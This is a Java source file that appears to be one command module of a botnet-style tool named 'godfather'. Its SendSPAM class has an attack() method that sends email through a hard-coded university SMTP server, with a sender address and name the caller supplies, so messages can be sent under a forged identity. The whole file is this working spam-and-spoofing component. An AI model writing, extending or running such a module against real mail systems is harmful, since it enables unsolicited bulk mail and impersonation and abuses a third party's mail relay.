package godfather.commands;

import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.SimpleEmail;
import org.apache.log4j.Logger;

public class SendSPAM
        implements Command {


    private static final long serialVersionUID = 1L;

    static Logger logger = Logger.getLogger(SendSPAM.class);

    private final String to;
    private final String from;
    private final String fromName;
    private final String subject;
    private final String message;


    public SendSPAM(String to, String from, String fromName, String subject, String message) {
        this.to = to;
        this.from = from;
        this.fromName = fromName;
        this.subject = subject;
        this.message = message;
    }



    @Override
    public void attack() {
        SimpleEmail email = new SimpleEmail();

        try {
            email.setHostName("smtp.ist.utl.pt");
            email.addTo(to, " ");
            email.setFrom(from, fromName);
            email.setSubject(subject);
            email.setMsg(message);
            email.send();
        } catch (EmailException e) {
            e.printStackTrace();
            logger.info("Failed Sending Email");
        }

    }
}
